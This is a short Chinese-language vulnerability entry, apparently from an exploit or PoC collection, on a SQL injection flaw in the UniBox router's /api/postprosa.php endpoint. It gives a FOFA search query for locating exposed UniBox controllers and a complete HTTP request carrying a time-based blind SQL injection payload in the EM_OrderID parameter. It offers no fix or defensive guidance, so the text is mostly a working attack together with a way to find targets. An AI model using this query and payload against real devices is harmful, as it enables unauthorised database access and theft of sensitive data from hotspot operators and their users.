# unibox路由器postprosa接口存在SQL注入

# 漏洞描述
UniBox 是一款一体化网络/热点控制器，可以部署为管理公共 WiFi 热点的热点网关，也可以部署为办公室和企业的网络控制器。unibox路由器postprosa存在SQL注入漏洞，攻击者可以根据该漏洞获取数据库权限，查看大量敏感信息。

# fofa
```
body="Unibox" && body="Controller"
```

## poc

```javascript
POST /api/postprosa.php HTTP/1.1
Host: 127.0.0.1:8888
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Cookie: http304ok=0; PHPSESSID=pvpehubud7epklbme9m4s69b0q;
Connection: close

EM_OrderID=1'+AND+(SELECT+3676+FROM+(SELECT(SLEEP(5)))sdgB)+AND+'rBTA'%3d'rBTA
```
